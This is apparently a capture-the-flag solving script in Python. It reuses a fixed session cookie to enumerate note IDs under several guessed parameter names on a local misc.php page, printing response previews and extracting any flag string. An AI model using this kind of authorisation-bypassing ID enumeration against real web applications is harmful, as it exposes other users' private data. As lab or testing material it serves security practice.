import requests
import time

base_url = "http://127.0.0.1/misc.php"
session_cookie = "17f3f417d868573c3079e3f6ee928eb6"

session = requests.Session()
session.cookies.update({'PHPSESSID': session_cookie})
session.headers.update({'User-Agent': 'Security-Tester/1.0'})

param_names = ['note_id', 'noteid', 'id', 'note', 'nid']
note_ids = range(1, 10)

print("[*] Testing misc.php with session persistence")
print(f"[*] Testing {len(param_names)} parameter names with {len(note_ids)} note IDs")
print("-" * 60)

found_content = False

for param in param_names:
    print(f"\n[+] Parameter: {param}")
    for nid in note_ids:
        params = {param: nid}
        try:
            resp = session.get(base_url, params=params, timeout=30, allow_redirects=False)
            if resp.text and len(resp.text.strip()) > 10:
                content_preview = resp.text.replace('\n', ' ')[:150]
                print(f"  [!] id={nid}: Status={resp.status_code}, Len={len(resp.text)}, Preview={content_preview}")
                found_content = True
                
                if 'FLAG{' in resp.text:
                    flag_start = resp.text.find('FLAG{')
                    flag_end = resp.text.find('}', flag_start) + 1
                    flag = resp.text[flag_start:flag_end]
                    print(f"  [CRITICAL] FLAG: {flag}")
                    
        except requests.exceptions.RequestException as e:
            print(f"  [-] id={nid}: Error - {str(e)[:50]}")
        
        time.sleep(0.2)
        
        params = {param: nid, 'action': 'view'}
        try:
            resp = session.get(base_url, params=params, timeout=30, allow_redirects=False)
            if resp.text and len(resp.text.strip()) > 10:
                content_preview = resp.text.replace('\n', ' ')[:150]
                print(f"  [!] id={nid}+action=view: Status={resp.status_code}, Len={len(resp.text)}, Preview={content_preview}")
                found_content = True
                
                if 'FLAG{' in resp.text:
                    flag_start = resp.text.find('FLAG{')
                    flag_end = resp.text.find('}', flag_start) + 1
                    flag = resp.text[flag_start:flag_end]
                    print(f"  [CRITICAL] FLAG: {flag}")
                    
        except requests.exceptions.RequestException as e:
            print(f"  [-] id={nid}+action: Error - {str(e)[:50]}")
        
        time.sleep(0.2)

if not found_content:
    print("\n[-] No content found in initial range 1-9")
    print("[*] Testing extended range 10-50...")
    
    note_ids_extended = range(10, 51)
    for param in param_names:
        print(f"\n[+] Parameter: {param} (extended)")
        for nid in note_ids_extended:
            params = {param: nid}
            try:
                resp = session.get(base_url, params=params, timeout=30, allow_redirects=False)
                if resp.text and len(resp.text.strip()) > 10:
                    content_preview = resp.text.replace('\n', ' ')[:100]
                    print(f"  [!] id={nid}: Status={resp.status_code}, Len={len(resp.text)}, Preview={content_preview}")
            except:
                pass
            time.sleep(0.1)

print("\n[*] Test complete")
